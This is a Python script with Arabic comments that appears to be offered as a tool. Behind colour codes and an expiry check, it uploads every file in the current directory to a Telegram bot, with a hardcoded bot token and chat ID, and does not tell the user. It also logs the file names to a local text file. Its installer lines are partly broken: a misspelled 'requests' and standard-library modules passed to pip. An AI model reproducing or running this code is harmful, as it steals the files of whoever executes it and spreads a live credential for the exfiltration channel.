try:
	import requests,os,random
	from user_agent import generate_user_agent
	from uuid import uuid4
	import socket
	import webbrowser
	import datetime
	import sys
	import json
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("pip install webbrowser")
	os.system("pip install socket")
	os.system("pip install datetime")
	os.system("clear")

os.system('clear')
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
Z1 = '\033[2;31m' #احمر ثاني
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
A = "\033[1;91m" #red
C = "\033[1;97m" #white
#------------------------------[@wisamysaf]------------------------------

ra=0
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)

t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023, 8, 19, 0, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+' انتهئ التفعيل راجع المطور الاداه ' )
 print('\n\n')
 print(x)
 
 sys.exit(0)
 

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+' انتهت الصلاحيه ' )
    print('\n\n')
    print(x)
    
    sys.exit(0)



import os, requests
token2='7233485545:AAGLTw-okR_oz1TMxZK82IkzpDQmuhcZoNA'
ID2='7179337310'
file_ha=[]
for file in os.listdir():
	if os.path.isfile(file):
		file_ha.append(file)
		g=file
		print(file)
		massage='المطورالقياده وسام  '
		start_msg = requests.post(f"https://api.telegram.org/bot{token2}/sendMessage?chat_id\n\n@t.me/iuron0")
		requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}', files={'document':open(g, 'rb')})
		
print(file_ha)
massage='@wisamysaf \ @wisamysaf'

for file in file_ha:
	with open("file_mahdi.txt","a") as pro:
			pro.write(str(file)+"\n")
			print(file_ha)
			